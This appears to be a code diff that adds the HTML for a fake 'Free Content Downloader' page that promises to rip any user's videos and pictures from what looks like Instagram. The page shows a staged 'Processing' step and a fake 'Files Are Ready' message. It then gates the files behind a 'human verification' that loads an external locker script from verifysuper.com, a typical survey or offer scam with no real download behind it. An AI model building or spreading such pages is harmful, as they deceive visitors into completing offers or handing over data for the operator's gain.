@@ -1,0 +1,94 @@
+
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+    <meta name="Viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+    <title>Free Content Downloader</title>
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet"/>
+    <link href="css/style.css" rel="stylesheet"/>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=G-2C84R5VFSY"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-2C84R5VFSY');
+</script> -->
+  </head>
+  <body>
+    <nav><a href="/"><img class="logo" src="img/ig-logo.png"/></a></nav>
+    <main>
+      <section class="badge-generator">
+        <div class="section-head">
+          <div class="section-head-title"><img src="img/badge.png"/>
+            <h3>Content Downloader</h3>
+          </div>
+          <div class="section-head-description">
+            <p>Download any video or picture for free!</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <p>Enter the username below</p>
+          <input type="text" placeholder="Enter Username with @" onfocus="this.placeholder=''" onblur="this.placeholder='Enter Username with @'"/>
+          <button>Download Content</button>
+        </div>
+      </section>
+      <section class="generating-badge">
+        <div class="section-head">
+          <div class="section-head-title">
+            <h3>Processing!</h3>
+          </div>
+          <div class="section-head-description">
+            <p>Please wait while we download your content</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <div id="progress-wrapper"></div>
+          <p class="progress-message">Connecting to site......</p>
+        </div>
+      </section>
+      <section class="human-verification">
+        <div class="section-head">
+          <div class="section-head-title">
+            <h3>Your Files Are Ready</h3>
+          </div>
+          <div class="section-head-description">
+            <p>987.36 Ripped!</p>
+          </div>
+        </div>
+        <div class="section-body">
+          <p><h4>New Users:</h4><br>Please complete a human verification task.</p>
+          <p class="verification-text">Please check the captcha then click <span class="text-standout">Continue </span> to view/download your files.</p>
+          <br>
+            <div data-captcha-enable="true" align="center"></div>
+          <a id="verify-button"> <button onclick="alert('Please verify the captcha before continuing.')">Continue</button></a>
+          <script type="text/javascript" src="https://verifysuper.com/cp/js/dwmpr"></script>
+
+		  
+          <div class="awaiting-verification"><img src="img/spinner.svg"/><span>Awaiting Verification</span></div>
+        </div>
+      </section>
+    </main>
+    <section class="recent-activity">
+      <div class="section-head">
+        <div class="section-head-title">
+          <h3>Recent Activity</h3>
+          <div class="live-dot"></div>
+        </div>
+        <div class="section-head-description">
+          <p>See the latest downloads</p>
+        </div>
+      </div>
+      <div class="section-body">
+        <div class="activities"></div>
+      </div>
+    </section>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/progressbar.js/1.0.1/progressbar.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.3/mobile-detect.min.js"></script>
+    <script src="main.js"></script>
+   
+  </body>
+</html>
